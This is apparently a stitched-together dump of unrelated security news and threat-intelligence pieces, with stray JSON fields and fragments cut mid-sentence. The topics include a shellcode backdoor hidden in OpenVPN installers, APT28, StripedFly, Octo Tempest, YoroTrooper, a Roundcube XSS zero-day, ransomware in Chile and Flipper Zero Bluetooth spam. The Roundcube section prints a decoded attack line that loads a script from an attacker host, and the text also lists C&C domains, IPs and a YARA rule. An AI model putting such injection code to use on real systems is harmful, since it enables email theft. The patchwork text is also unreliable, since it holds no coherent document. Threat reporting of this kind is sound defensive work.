hash is then passed to the CryptBinaryToStringA() API function for the purpose of generating Base64 encoded data using the second UUID, as shown in the figure below.The Shellcode employs the Windows Crypto API CryptCreateHash() to generate an MD5 hash using the first UUID. Subsequently, the Shellcode proceeds to create a second MD5 hash, this time of the previously generated hash. The figure below shows the routine for creating these hashes.Once the hashes are generated, the Shellcode proceeds to create a 128-bit AES encryption key using the CryptDeriveKey() function. The figure below shows the routine involved in creating this 128-bit AES key.The newly generated AES key is employed to enable encrypted communication with the C&C server. To establish a secure connection with the C&C server, the Shellcode utilizes a socket.Following the key initialization, the Shellcode initiates another thread, within which it establishes a socket connection and verifies the internet connectivity. To determine internet availability, the Shellcode evaluates connections to a predefined list of websites. If any of these websites can be reached, the Shellcode proceeds with additional operations. The figure below shows the routine containing hardcoded URLs.Following an internet connectivity check, the Shellcode initiates communication with the C&C server. To facilitate this communication, the Shellcode spawns additional threads. Specifically, it creates two additional threads that collaborate to manage the commands exchanged between the backdoor and the C&C server.The Shellcode creates a dispatch thread to handle the commands posted by the worker thread. The function of the dispatch thread is to create a message queue leveraging the PeekMessageW() API. Then, the worker thread proceeds to send the message ID alongside the command buffer to the message queue using the PostThreadMessageW() API.Once the dispatch thread receives a message from the worker thread, the message is then retrieved with the help of the GetMessageW() API.Based on the ID of the messages received, the command handler will accordingly receive the message. The figure below shows the dispatch thread.The shellcode is communicating to the IP 43.246.209[.]83 whose details are mentioned below:Upon establishing a successful connection with the C&C server, the attacker gains the ability to take control of the victim’s machine, perform malicious activities, and deploy additional malware, such as ransomware and others.CRIL also noticed three additional files engaged in communication with the C&C server, masquerading as GoogleMeet and ZoomInstaller.TAs often hide their malware payloads within genuine software installer files for various strategic reasons. This approach leverages the trust users have in legitimate software, increasing the likelihood of users willingly executing these files – believing them to be secure. Moreover, genuine software installers are frequently distributed through widely recognized channels, diminishing suspicion and boosting the chances of successful infiltration.In this case, TAs are concealing a shellcode runner within the legitimate OpenVPN software application. The analyzed Shellcode displays a high level of sophistication and presents a significant danger to unsuspecting users, largely due to the fact that the associated files possess valid digital signatures. This attribute significantly reduces the likelihood of detection at the time of writing this blog.Moreover, the manual nature of the malware’s operation suggests that the TAs are carefully selecting their targets for more precise and specific operations. This underscores the importance of user vigilance in light of the potential for further such attacks. Users should remain alert to the possibility of similar threats in the future.rule Higasia_APT{    meta:        author = “Cyble”        description = “Detects Higasia Loader”        date = “2023-10-26”        os = “Windows”        scan_type = “file”        severity = 90        reference_sample = “d329431aa23dba73214d1c104d01d57653fc59989a915337d1f92e6c7b56ac13”    strings:        $a = “MECHREVO”        $b = “\\\\shellcode_runner.pdb”        $c = “shellcode_runner\\\\”    condition:        uint16(0) == 0x5a4d and all of them}\n\t\t\t\tCyble Research Labs has discovered a new Android banking Trojan called Aberebot that targets banking customers of 140+ banks in 18 countries through phishing.\t\t\t\n\t\t\t\tA phishing campaign from a Twitter post.

The more they happen, and the longer they last, the more expensive and dangerous they become,” she continued.“HHS is working closely with CISA and our industry partners to deliver the tools, resources, and guidance needed to help healthcare organizations, especially our under-resourced hospitals and health centers, mount a strong cyber-defense and protect patient lives.”"

      "text": " The Russian APT28 hacking group (aka 'Strontium' or 'Fancy Bear') has been targeting government entities, businesses, universities, research institutes, and think tanks in France since the second half of 2021.The Russian hackers have been compromising peripheral devices on critical networks of French organizations and moving away from utilizing backdoors to evade detection.ANSSI has mapped the TTPs (techniques, tactics, and procedures) of APT28, reporting that the threat group uses brute-forcing and leaked databases containing credentials to breach accounts and Ubiquiti routers on targeted networks.In one case from April 2023, the attackers ran a phishing campaign that tricked the recipients into running PowerShell that exposed their system configuration, running processes, and other OS details.Between March 2022 and June 2023, APT28 sent emails to Outlook users that exploited the then zero-day vulnerability now tracked as CVE-2023-23397, placing the initial exploitation a month earlier than what was recently reported.During this period, the attackers also exploited CVE-2022-30190 (aka \"Follina\") in the Microsoft Windows Support Diagnostic Tool and CVE-2020-12641, CVE-2020-35730, CVE-2021-44026 in the Roundcube application.The tools used in the first stages of the attacks include the Mimikatz password extractor and the reGeorg traffic relaying tool, as well as the Mockbin and Mocky open-source services.ANSSI also reports that APT28 uses a range of VPN clients, including SurfShark, ExpressVPN, ProtonVPN, PureVPN, NordVPN, CactusVPN, WorldVPN, and VPNSecure.As a cyber-espionage group, data access and exfiltration are at the core of Strontium's operational goals.ANSSI has observed the threat actors retrieving authentication information using native utilities and stealing emails containing sensitive information and correspondence.Specifically, the attackers exploit CVE-2023-23397 to trigger an SMB connection from the targeted accounts to a service under their control, allowing the retrieval of the NetNTLMv2 authentication hash, which can be used on other services, too.APT28's command and control server (C2) infrastructure relies on legitimate cloud services, such as Microsoft OneDrive and Google Drive, to make the exchange less likely to raise any alarms by traffic monitoring tools.Finally, ANSSI has seen evidence that the attackers collect data using the CredoMap implant, which targets information stored in the victim's web browser, such as authentication cookies.Mockbin and the Pipedream service are also involved in the data exfiltration process.ANSSI emphasizes a comprehensive approach to security, which entails assessing risks. In the case of the APT28 threat, focusing on email security is crucial.The agency's key recommendations around email security include:"

      "title": "StripedFly malware framework infects 1 million Windows, Linux hosts",
      "text": " A sophisticated cross-platform malware platform named StripedFly flew under the radar of cybersecurity researchers for five years, infecting over a million Windows and Linux systems during that time.Kaspersky discovered the true nature of the malicious framework last year, finding evidence of its activity starting in 2017, with the malware wrongly classified as just a Monero cryptocurrency miner.While it's unclear if this malware framework was utilized for revenue generation or cyber espionage, Kaspersky says its sophistication indicates that this is an APT (advanced persistent threat) malware.The StripedFly malware framework was first discovered after Kaspersky found the platform's shellcode injected in the WININIT.EXE process, a legitimate Windows OS process that handles the initialization of various subsystems.After investigating the injected code, they determined it downloads and executes additional files, such as PowerShell scripts, from legitimate hosting services like Bitbucket, GitHub, and GitLab, including PowerShell scripts.Further investigation showed that infected devices were likely first breached using a custom EternalBlue SMBv1 exploit that targeted internet-exposed computers.The final StripedFly payload (system.img) features a custom lightweight TOR network client to protect its network communications from interception, the ability to disable the SMBv1 protocol, and spread to other Windows and Linux devices on the network using SSH and EternalBlue.The malware's command and control (C2) server is on the TOR network, and communication with it involves frequent beacon messages containing the victim's unique ID.For persistence on Windows systems, StripedFly adjusts its behavior based on the level of privileges it runs on and the presence of PowerShell.Without PowerShell, it generates a hidden file in the %APPDATA% directory. In cases where PowerShell is available, it executes scripts for creating scheduled tasks or modifying Windows Registry keys.On Linux, the malware assumes the name 'sd-pam'. It achieves persistence using systemd services, an autostarting .desktop file, or by modifying various profile and startup files, such as  /etc/rc*, profile, bashrc, or inittab files.The Bitbucket repository delivering the final stage payload on Windows systems indicates that between April 2023 and September 2023, there have been nearly 60,000 system infections.It is estimated that StripedFly has infected at least 220,000 Windows systems since February 2022, but stats from before that date are unavailable, and the repository was created in 2018.The malware operates as a monolithic binary executable with pluggable modules, giving it an operational versatility often associated with APT operations.Here's a summary of StripedFly's modules from Kaspersky's report:The presence of the Monero crypto miner is considered a diversion attempt, with the primary objectives of the threat actors being data theft and system exploitation facilitated by the other modules.\"Notably, the Monero cryptocurrency mined by this module reached its peak value at $542.33 on January 9, 2018, compared to its 2017 value of around $10. As of 2023, it has maintained a value of approximately $150.\"\"Kaspersky experts emphasize that the mining module is the primary factor enabling the malware to evade detection for an extended period.\"The 'repeatable tasks module' also suggests that the unidentified attackers could be interested in revenue generation for some victims."

It can be used to retrieve with \"near perfect accuracy\" data from Safari,  as well as Firefox, Tor, and Edge on iOS.iLeakage was developed by a team of academics from Georgia Tech, University of Michigan, and Ruhr University Bochum who examined Safari's side-channel resilience and managed to bypass existing countermeasures by implementing a timerless and architecture-agnostic method based on race conditions.The researchers focused on reading sensitive information from Safari and were able to steal data by creating a primitive that can speculatively read and leak any 64-bit pointer in the address space Apple's browser uses for the rendering process.They achieved this by defeating the side-channel protections Apple implemented in its browser, e.g. low-resolution timer, compressed 35-bit addressing, and value poisoning.The researchers also bypassed the site isolation policy in Safari, which separates websites into different address spaces based on their effective top-level domain (eTLD) plus one subdomain.They used a new technique that uses the JavaScript window.open API allows an attacker page to share the same address space as arbitrary victim pages.By using using speculative type confusion to bypass Apple’s compressed 35-bit addressing and value poisoning countermeasures, the researchers could leak sensitive data from the target page, such as passwords and emails.The proof-of-concept code for the attack is in JavaScript and WebAssembly, the two programming languages for delivering dynamic web content.The video below shows how Gmail messages in Safari running an iPad were retrieved using the iLeakage attack. The basic requirement for the attack to work is that the victim user interacts with the attacker's page.The researchers used the same method to retrieve a password for an Instagram test account that was auto-filled in the Safari web browser using the LastPass password management service.In another experiment, the researchers demonstrated how the iLeakage attacks also works on Chrome for iOS and were able to retrieve the YouTube watch history.They explain that Apple's policy forces all third-party iOS browsers to be overlays on top of Safari and use Apple browser's JavaScript engine.This mechanism, present in all modern CPUs, dramatically improves performance; however, design flaws can cause data leaks, as proven by the Meltdown and Spectre attacks disclosed almost six years ago.iLeakage impacts all Apple devices released from 2020 that are powered by Apple's A-series and M-series ARM processors.The attack is largely undetectable, leaving no traces on the victim's system in the form of logs, apart from maybe an entry of the attacker's webpage in the browser cache.Nevertheless, the researchers underline that the attack is difficult to carry out \"and requires advanced knowledge of browser-based side-channel attacks and Safari's implementation.\"iLeakage was reported privately to Apple on September 12, 2022 and the company developed the following mitigations for macOS:The mitigation comes with the warning that it might introduce some instability. If users want to disable it, they can do it from the debug menu by running in the terminal the command defaults write com.apple.Safari IncludeInternalDebugMenu 0.Besides the actual implications of iLeakage, this research highlights the potential speculative execution risks in emerging ARM-based platforms that have not been scrutinized as heavily as x86 architectures."

      "title": "Microsoft: Octo Tempest is one of the most dangerous financial hacking groups",
      "text": " Microsoft has published a detailed profile of a native English-speaking threat actor with advanced social engineering capabilities it tracks as Octo Tempest, that targets companies in data extortion and ransomware attacks.Octo Tempest’s attacks have steadily evolved since early 2022, expanding their targeting to organizations providing cable telecommunications, email, and tech services, and partnering with the ALPHV/BlackCat ransomware group.The threat actor was initially observed selling SIM swaps and stealing accounts of high-profile individuals with cryptocurrency assets.In late 2022, Octa Tempest moved to phishing, social engineering, resetting passwords en-masse for the customers of breached service providers, and data theft.Earlier this year, the threat group attacked companies in the gaming, hospitality, retail, manufacturing, technology, and financial sectors, as well as managed service providers (MSPs).After becoming an ALPHV/BlackCat affiliate, Octa Tempest deployed the ransomware both to steal and to encrypt victim data.The group used its accumulated experience to build more advanced and aggressive attacks and also started to monetize intrusions by extorting victims after stealing data.Microsoft says that Octo Tempest also used direct physical threats in some cases to obtain logins that would advance their attack.In an odd turn of events, Octo Tempest became an affiliate of the ALPHV/BlackCat ransomware-as-a-service (RaaS) operation, Microsoft says, and by June they started deploying both the Windows and Linux ransomware payloads, focusing on VMware ESXi servers lately.The more recent attacks from this group target organizations in a variety of sectors, including gaming, natural resources, hospitality, consumer products, retail, managed service providers, manufacturing, law, technology, and financial services.Microsoft assesses that Octo Tempest is a well-organized group that includes members with extensive technical knowledge and multiple hand-on-keyboard operators.The hackers often gain initial access through advanced social engineering that targets accounts of technical administrators (e.g. support and help desk staff) with enough permissions to further the attack.They research the company to identify the targets they can impersonate to the level of mimicking the speech patterns of the individual in phone calls.By doing so, they trick technical administrators into performing password resets and reset multi-factor authentication (MFA) methods.Other methods for initial access include:Once they get sufficient access, Octo Tempest hackers start the reconnaissance stage of the attack by enumerating hosts and services and collecting information that would permit abusing legitimate channels to progress the intrusion.“Initial bulk-export of users, groups, and device information is closely followed by enumerating data and resources readily available to the user’s profile within virtual desktop infrastructure or enterprise-hosted resources” - MicrosoftOcto Tempest then proceeds to explore the infrastructure, enumerating access and resources across cloud environments, code repositories, server and backup management systems.To escalate privileges, the threat actor again turns to social engineering, SIM-swapping, or call forwarding, and initiates a self-service password reset of the target’s account.During this step, the hackers build trust with the victim by using compromised accounts and demonstrating an understanding of the company’s procedures. If they have a manager’s account, they approve requests for increased permissions themselves.For as long as they have access, Octo Tempest continues to look for additional credentials to expand their reach. They use tools like Jercretz and TruffleHog to automate the search for plaintext keys, secrets, and passwords across code repositories.To keep their tracks hidden, the hackers also target the accounts of security personnel, which allows them to disable security products and features.“Using compromised accounts, the threat actor leverages EDR and device management technologies to allow malicious tooling, deploy RMM software, remove or impair security products, data theft of sensitive files (e.g. files with credentials, signal messaging databases, etc.), and deploy malicious payloads” - MicrosoftAccording to Microsoft, Octo Tempest tries to hide their presence on the network by suppressing alerts of changes and modifying the mailbox rules to delete emails that could raise the victim’s suspicions of a breach.The researchers provide the following additional tools and techniques that Octo Tempest uses in their attacks:The hackers also move stolen data to their servers using a unique technique, which involves Azure Data Factory and automated pipelines to blend in with typical big data operations.To export SharePoint document libraries and transfer the files quicker, the attacker has been often observed to register legitimate Microsoft 365 backup solutions such as Veeam, AFI Backup, and CommVault. Microsoft notes that detecting or hunting for this threat actor in an environment is not an easy task due to the use of social engineering, living-off-the-land techniques, and the diverse tooling.However, the researchers provide a set of general guidelines that could help detect malicious activity, which starts with monitoring and reviewing identity-related processes, Azure environments, and endpoints.Octo Tempest is financially motivated and achieves its goals through stealing cryptocurrency, data theft extortion, or encrypting systems and asking for a ransom."

      "title": "Kazakhstan-associated YoroTrooper disguises origin of attacks as Azerbaijan",
      "text": " Talos assesses with high confidence that YoroTrooper operators are likely based in Kazakhstan based on their language preferences, use of Kazakhstani currency and very limited targeting of Kazakhstani entities, which only included the government’s Anti-Corruption Agency. Our primary observation that points toward the actor being of Kazakh origin is that they speak Kazakh and Russian, both of which are official languages of Kazakhstan. YoroTrooper frequently visits websites written in Kazakh and has used Russian in debugging and logging messages in their custom Python remote access trojans (RATs). For example, we have seen phrases such as “Сохраняю в {save_dir}” or “Файл загружен!\\nИмя” that translate to “I save in {save_dir}” and “File uploaded!\\nName” respectively, and the translation of output of commands to CP866 — the code page for Cyrillic. Starting in June 2023, we saw this actor using Uzbek in their implants, another popular language in Kazakhstan, enabling us to narrow down their country of origin. While this may be an attempt at generating false flags to masquerade as an Uzbek adversary, it is highly likely that YoroTrooper operators are simply well-versed in Kazakh, Russian and Uzbek languages.A second observation that supports our assessment of YoroTrooper’s strong ties to Kazakhstan  is the involvement of Kazakhstani currency in their operations. The threat actor primarily relies on using cryptocurrency to pay for operating infrastructure such as domains and servers for hosting their lures, payloads and decoys, and regularly checks for currency conversion rates between Kazakhstani Tenge (KZT), Kazakhstan’s official currency and Bitcoin (BTC) on Google.The threat actor also uses online exchanges, such as alfachange[.]com, which converts money from Kazakhstani Tenge to Bitcoin via their Visa and Mastercard cards:Talos’ research found that YoroTrooper has a special defensive interest in repeatedly evaluating the security posture of the website of the Kazakhstani state-owned email service, mail[.]kz. YoroTrooper will regularly conduct security scans of mail[.]kz but has never registered any look-a-like domains or created credential harvesting pages spoofing the site, tactics the threat actor commonly uses when attempting to target an online service or its users. The image below shows bookmarks pertaining to the evaluation of mail[.]kz’s security posture saved on a browser used by YoroTrooper, indicating that the threat actor frequently visits these links to monitor the website for potential security vulnerabilities.This monitoring activity indicates YoroTrooper values mail[.]kz, as they have conducted similar security scanning for their own malicious infrastructure to verify that it is not vulnerable to exploitation. For example, YoroTrooper queried IP address 168[.]100[.]8[.]242 on Shodan, which hosted domain mail[.]asco[.]az-link[.]email on July 11, 2022 that was used by YoroTrooper to target entities in Azerbaijan in November 2022:YoroTrooper checking one of their own IP addresses in Shodan.Finally, Talos’ analysis of YoroTrooper’s victimology found that the only institution targeted in Kazakhstan was the government’s Anti-Corruption Agency. YoroTrooper facilitated this attack by creating a malicious subdomain mail[.]antikor[.]gov[.]kz[.]openingfile[.]net, that spoofed the legitimate government domain antikor[.]gov[.]kz:. We assess with high confidence that YoroTrooper made numerous efforts to disguise their origin by hosting a majority of their infrastructure in Azerbaijan while still targeting institutions in Azerbaijan, using malicious sub-domains such as:YoroTrooper employs numerous tactics to obfuscate the origin of their activity, attempting to appear as if they are located in Azerbaijan. We observed that most of YoroTrooper’s operations are routed via Azerbaijan, though notably, the threat actor does not appear to speak the Azerbaijani language. Intelligence obtained by Talos indicates the adversary regularly translates information from Azerbaijani to Russian, the second official language in Kazakhstan.YoroTrooper using Google Translate to convert text from Azerbaijani to Russian for an account verification message.Furthermore, the operator drafts lures in Russian and then translates them to Azerbaijani to use in their phishing attacks:YoroTrooper makes an effort to have their operations appear as if they originate from Azerbaijan, looking to use VPN exit nodes in the country:Finally, we have also seen the threat actor searching for random contact information for Azerbaijani individuals, likely to use when setting up their infrastructure and tools:YoroTrooper’s targeting of government entities in these countries may indicate the operators are motivated by Kazakh state interests or working under the direction of the Kazakh government. It is also possible, however, that the actors are simply motivated by financial gain achieved by selling restricted state information. Talos is pursuing further research on YoroTrooper’s intelligence collection goals to ascertain the group’s potential state sponsorship. A number of prominent and successful YoroTrooper intrusions took place in recent months, beginning in June 2023 when the adversary compromised a Tajiki national. Although we could not determine the identity of the victim, Talos assesses that the victim is associated with the Tajik government, based on the nature of the data that YoroTrooper exfiltrated from them, which amounted to 165MB of documents. Many of these documents consisted of government certificates and affidavits, appearing to belong to someone who has visibility into government personnel management and welfare.YoroTrooper consistently relies on vulnerability scanners such as Acunetix and open-source data from search engines such as Shodan to locate and infiltrate a target’s infrastructure. This exercise turned out to be extremely fruitful for YoroTrooper, who from May to July 2023, successfully compromised three state-owned Tajiki and Kyrgyzstani websites and hosted malware payloads on them, with some malware still being hosted as of September 2023. The first website compromised in May 2023 was tpp[.]tj, which is managed by the country’s Chamber of Commerce and Industry of the Republic of Tajikistan.Subsequently, in July, YoroTrooper compromised and hosted malware on akn[.]tj, another state-owned website belonging to the Drug Control Agency under the President of the Republic of Tajikistan, as well as kyrgyzkomur[.]gov[.]kg, which belongs to Kyrgyzstan's state-owned coal enterprise.YoroTrooper also compromised a user from the Ministry of Transport and Roads of the Kyrgyz Republic, successfully harvesting some browser credentials from the user.YoroTrooper began its campaign to target Uzbeki government entities as early as January 2023. About eight months of aggressive attack attempts yielded success in August 2023, when YoroTrooper successfully compromised a high-ranking official from the Uzbek Ministry of Energy. While Talos confirmed the compromise, we could not determine what data was stolen from this individual.The following timeline provides an updated view and details of various geographies targeted since June 2023. TimeframeTargeted geographySalient TTPsSeptember 2023Tajikistan• Used an agreement statement between Bulgaria and Tajikistan as a lure.• Reused compromised Tajiki website for the Chamber of Commerce and Industry to host malware.• Deployed PowerShell-based implants and used Telegram APIs.August 2023Kyrgyzstan• Used a Kyrgyz Ministry of Transport circular as a lure/decoy document.• Used attacker-owned infrastructure to host malware.• Targeted and compromised an Uzbek Ministry of Energy senior official.• Reused custom-built reverse shell EXEs first seen in June 2023.• Reused a PyInstaller-wrapped, Python-based Google Chrome credential stealer that was first seen in January 2023, though this version did not include an upload capability.July 2023Tajikistan and Kyrgyzstan• Tajik Drug Control Agency’s website  akn[.]tj compromised to host payloads.• Kyrgyz state-owned coal enterprise KyrgyzKomur’s website, kyrgyzkomur[.]gov[.]kg, compromised and used to host malware.June 2023Tajikistan• Takij Ministry of Foreign Affairs targeted using the following lures:• Publication from the International Atomic Energy Agency (IAEA) and OECD Nuclear Energy Agency (NEA) on  Uranium: Resources, Production and Demand.• Used a compromised Tajiki website for the Chamber of Commerce and Industry to host malware.• First instance of deploying custom-built reverse shell EXEs.• Python implants ported to PowerShell and used Telegram APIs. YoroTrooper relies heavily on learning-on-the-go to carry on their malicious activities. We’ve observed the operator constantly attempting to buy new tools, such as VPN connections. Our research also indicated that the group actively relies on vulnerability scanners, such as Acunetix, and open-source data, such as the information available on Shodan, to locate and infiltrate the public-facing servers of their targets.YoroTrooper frequently conducts open-source searches of infrastructure they are interested in targeting, using search engines such as Google, Shodan and Censys to find vulnerabilities and leakages in a target's infrastructure. This research includes searching for vulnerable PHP-based servers and identifying content management systems (CMS) to find open directories.  Talos identified a number of operational email accounts and other infrastructure used by YoroTrooper to facilitate their operations. YoroTrooper primarily uses the email address “anadozz[at]tuta[.]io” to register and purchase tools and services such as VPN accounts. For example, in 2022, the actors used this email address to obtain a subscription to NordVPN, valid from 2022 to 2025, from darkstore[.]su:YoroTrooper has also extensively used and maintained access to two other email addresses, “n.ayyubov[at]mail[.]ru” and “danyjackson120293[at]proton[.]me”, via their remote machines. It is unclear if these email addresses actually belong to the operators or are just compromised accounts being leveraged by YoroTrooper.A couple of months before purchasing the NordVPN account, YoroTrooper configured and purchased a VPS instance from netx[.]hosting for $16 USD a month. This is likely another remote machine that the threat actor used to expand their malicious operations.Talos also found that YoroTrooper accesses their malicious infrastructure several times over the course of their campaigns in order to upload malware and access URLs hosted on their servers, such as: YoroTrooper regularly sends spearphishing messages to victims that direct to attacker-controlled pages designed to harvest the target’s credentials. The operators collect and deploy phishing pages on servers specific to a target country. Some of the malicious credential-harvesting pages found on YoroTrooper’s VPS systems were:The practice of credential-harvesting runs complimentary to YoroTrooper’s malware-based operations with the end goal being data theft. The vast majority of YoroTrooper malware analyzed by Talos belongs to different families of information stealers.  After Talos released our report on YoroTrooper earlier this year, we have seen the operators make slight adjustments to their infection chains. The infection mechanisms have become more modular with:While many of their mechanisms and implants have seen slight variation, Talos assesses with high confidence that YoroTrooper is changing their final malware implants and looking to develop and adopt new malware families into their arsenal.As part of their exercise of retooling, YoroTrooper has also ported their custom-built Python implants that were previously packaged into executables using frameworks such as Nuitka and PyInstaller, to PowerShell scripts that are now directly run from the central HTA script.The new infection chain is outlined in the graphic below. YoroTrooper has started using a simple, custom-built, Windows executable-based interactive reverse shell to run commands on infected endpoints via cmd[.]exe: Since February 2023, YoroTrooper has ported their Python-based RAT to PowerShell. This is likely an attempt to reduce the footprint of the malware on the infected systems, as a Python-based RAT packaged into an EXE using PyInstaller or NUITKA usually results in a binary of a few megabytes, however the same code in PowerShell is only a few kilobytes and runs natively on the system. The core functionality remains the same, with the RAT taking commands and exfiltrating data to Telegram-based C2s.Python-based RAT (left) vs. the ported PowerShell code (right). In July 2023, YoroTrooper began experimenting with multiple types of delivery vehicles for their implants and adopting other malware families into their arsenal.One such example is a Windows executable that is designed to work in lieu of the entire LNK and HTA-based infection chain previously used by the actors. This executable is a PyInstaller-wrapped binary where the Python code will:We found one sample from July 2023 that downloads and displays a decoy document from the KyrgyzKomur website, which belongs to the coal division within the Kyrgyz Ministry of Energy. This document is a memo on a transportation agreement between the Republic of Bulgaria and Tajikistan.

Decoding the payload in the onerror attribute gives us the following JavaScript code (with the malicious URL manually defanged), which will be executed in the browser of the victim in the context of their Roundcube session:var fe=document.createElement('script');fe.src=\"https://recsecas[.]com/controlserver/checkupdate.js\";document.body.appendChild(fe);In summary, by sending a specially crafted email message, attackers are able to load arbitrary JavaScript code in the context of the Roundcube user’s browser window. No manual interaction other than viewing the message in a web browser is required.The second stage is a simple JavaScript loader named checkupdate.js and is shown in Figure 3.The final JavaScript payload – shown in Figure 4 – is able to list folders and emails in the current Roundcube account, and to exfiltrate email messages to the C&C server by making HTTP requests to https://recsecas[.]com/controlserver/saveMessage.Winter Vivern has stepped up its operations by using a zero-day vulnerability in Roundcube. Previously, it was using known vulnerabilities in Roundcube and Zimbra, for which proofs of concept are available online.Despite the low sophistication of the group’s toolset, it is a threat to governments in Europe because of its persistence, very regular running of phishing campaigns, and because a significant number of internet-facing applications are not regularly updated although they are known to contain vulnerabilities.\n\n\n\nSHA-1\n\n\nFilename\n\n\nDetection\n\n\nDescription\n\n\n\n\n\n\n97ED594EF2B5755F0549C6C5758377C0B87CFAE0\n\n\ncheckupdate.js\n\n\nJS/WinterVivern.B\n\n\nJavaScript loader.\n\n\n\n\n8BF7FCC70F6CE032217D9210EF30314DDD6B8135\n\n\nN/A\n\n\nJS/Kryptik.BIK\n\n\nJavaScript payload exfiltrating emails in Roundcube.\n\n\n\nSHA-1FilenameDetectionDescription97ED594EF2B5755F0549C6C5758377C0B87CFAE0checkupdate.jsJS/WinterVivern.BJavaScript loader.8BF7FCC70F6CE032217D9210EF30314DDD6B8135N/AJS/Kryptik.BIKJavaScript payload exfiltrating emails in Roundcube.\n\n\n\nIP\n\n\nDomain\n\n\nHosting provider\n\n\nFirst seen\n\n\nDetails\n\n\n\n\n\n\n38.180.76[.]31\n\n\nrecsecas[.]com\n\n\nM247 Europe SRL\n\n\n2023-09-28\n\n\nWinter Vivern C&C server\n\n\n\nIPDomainHosting providerFirst seenDetails38.180.76[.]31recsecas[.]comM247 Europe SRL2023-09-28Winter Vivern C&C serverteam.managment@outlook[.]comTacticIDNameDescriptionResource DevelopmentAcquire Infrastructure: DomainsWinter Vivern operators bought a domain at Registrar.eu.Acquire Infrastructure: ServerWinter Vivern operators rented a server at M247.Develop Capabilities: ExploitsWinter Vivern operators probably developed an exploit for Roundcube.Initial AccessExploit Public-Facing ApplicationWinter Vivern sent an email exploiting CVE‑2023-5631 in Roundcube.PhishingThe vulnerability is triggered via a phishing email, which should be opened in the Roundcube webmail by the victim.ExecutionExploitation for Client ExecutionThe JavaScript payload is executed by an XSS vulnerability in Roundcube.DiscoveryAccount Discovery: Email AccountThe JavaScript payload can list folders in the email account.CollectionEmail Collection: Remote Email CollectionThe JavaScript payload can exfiltrate emails from the Roundcube account.Command and ControlApplication Layer Protocol: Web ProtocolsC&C communications use HTTPs.ExfiltrationExfiltration Over C2 ChannelExfiltration is done via HTTPs and to the same C&C server.\n      Sign up for our newsletters\n    ESET ResearchUnlucky Kamran: Android malware spying on Urdu-speaking residents of Gilgit-BaltistanESET ResearchUnlucky Kamran: Android malware spying on Urdu-speaking residents of Gilgit-Baltistan • ESET ResearchWho killed Mozi?

      "text": " Leaving environment files open to the public is one of the simplest mistakes that web admins can make, but it can have disastrous consequences. Despite leaving some of its sensitive credentials exposed, New England Biolabs seems to have dodged a bullet.On September 18th, the Cybernews research team discovered two publicly hosted environment files (.env) attributed to New England Biolabs (NEB). They included a lot of sensitive information, such as database credentials, login information for the SMTP server, enterprise payment processing information, and others.Both files were designated for the production environment, meaning they were likely used in real-time scenarios to handle operations in the company’s Canada branch.If cybercriminals had found those files first, they’d be able to send emails on behalf of the organization, access and exploit sensitive data, and even try to authorize payments.NEB is a known producer and supplier of recombinant and native enzyme reage nts for life science research. The company, founded in 1974, also provides products and services supporting genome editing, synthetic biology, and next-generation sequencing.“This leak is very significant. Environment files typically contain sensitive configuration information and credentials. Their exposure is a significant threat to organizations. If cybercriminals discover the environment file first, it puts the organization at risk of unauthorized access to critical data, potential data breaches, data tampering, financial losses, reputational damage, and legal and compliance issues,” Cybernews researchers write.“It is easy to mess up server configuration files, such as .htaccess, and overlook important restrictions. However, administrators should place the .env files in inaccessible directories, typically, the root directory. By default, the file is inaccessible, but after manual setups, updates, configurations, always do check if it stays that way,” researchers advise.As of October 5th, upon communication with the NEB, the environment files have been secured and are no longer accessible. Cybernews reached out to the NEB but received no comments before publishing this article.ne\nCopyright@securityaffairs 2023 "

The company provides various IT services, including internet access, mobile and landline telephone, and data center and IT managed services.On the morning of October 23rd, GTD suffered a cyberattack that impacted numerous services, including its data centers, internet access, and Voice-over-IP (VoIP).\"We understand the importance of proactive and fluid communication in the face of incidents, therefore, in accordance with what we previously discussed on the phone, I would like to inform you that we are experiencing a partial impact on services as a result of a cybersecurity incident,\" reads a GTD security incident notification.\"This impact is limited to part of our laas platform and some shared services (IP telephony services, VPNs and OTT television system). Our communication COR, as well as our ISP, are operating normally.\"To prevent the attack's spread, the company disconnected its IaSS platform from the internet, leading to these outages.Today, Chile’s Computer Security Incident Response Team (CSIRT) confirmed that GTD suffered a ransomware attack.\"As a consequence, some public services in our country have presented unavailability on their websites.\"The CSIRT is requiring all public institutions who are utilizing GTD's IaaS services to notify the government under decree No. 273, which requires all State agencies to report when a cybersecurity incident may impact them.Rorschach ransomware (aka BabLock) is a relatively new encryptor seen by Check Point Research in April 2023. While the researchers could not link the encryptor to a particular ransomware gang, they warned that it was both sophisticated and very fast, able to encrypt a device in 4 minutes and 30 seconds.In a report on the GTD attack seen by BleepingComputer, the threat actors are utilizing DLL sideloading vulnerabilities in legitimate Trend Micro, BitDefender, and Cortex XDR executables to load a malicious DLL.This DLL is the Rorschach injector, which will inject a ransomware payload called \"config[.]ini\" into a Notepad process. Once loaded, ransomware will begin encrypting files on the device.CSIRT has shared the following IOCs related to the attack on GTD below, with u.exe and d.exe being legitimate TrendMicro and BitDefender executables used in the attack and the DLLs containing the malware.Chile’s CSIRT recommends that all organizations connected to GTD’s IaaS go through the following steps to confirm they were not breached in the attack:BleepingComputer reached out to Grupo GTD with further questions about the attack this morning but did not receive a response."

      "text": " A custom Flipper Zero firmware called 'Xtreme' has added a new feature to perform Bluetooth spam attacks on Android and Windows devices.The main idea behind the spam attack is to use Flipper Zero's wireless communication capabilities to spoof advertising packets and transmit them to devices in range of pairing and connection requests.This type of spam attack can confuse the target, make it difficult to discern between legitimate and spoofed devices, and even disrupt the user experience with non-stop notifications popping up on the targeted device.The admins even shared a demo video showcasing a denial of service (DoS) attack on a Samsung Galaxy device, where a constant feed of connection notifications renders the device unusable.The BLE Spam app currently gives users eight flood attack options, including:Choosing any of the above causes Flipper Zero to begin broadcasting the corresponding Bluetooth packets to pop-up connectivity prompts and notifications on devices in range.These attacks are more of an annoyance rather than a real threat. However, as BLE Spam allows users to craft custom notifications, these spams can get creative and trickier, playing a role in social engineering or other threat scenarios.Android 14 and Windows 11 devices, by default, display notifications on Bluetooth connection requests, so these Flipper Zero attacks could cause problems. Thankfully, there's an easy way to block these notifications on both systems.On Android, head to Settings → Google → Nearby Share, and turn the toggle on Show notification to the \"Off\" position.The same menu can be accessed through Settings → Connected Devices → Connection preferences → Nearby Share.On Windows, open Settings, select 'Bluetooth & devices' from the menu on the left, then click on 'Devices,' scroll down to 'Device settings,' and turn the 'Show notifications to connect using Swift Pair' toggle to the 'Off' position.Users shouldn't be too worried about rogue broadcasts of this kind, as these cannot perform code execution on recipient devices or cause direct harm.However, noting the potential for phishing is crucial, and knowing how to stop the notifications in cases of persistent pranking can save people time 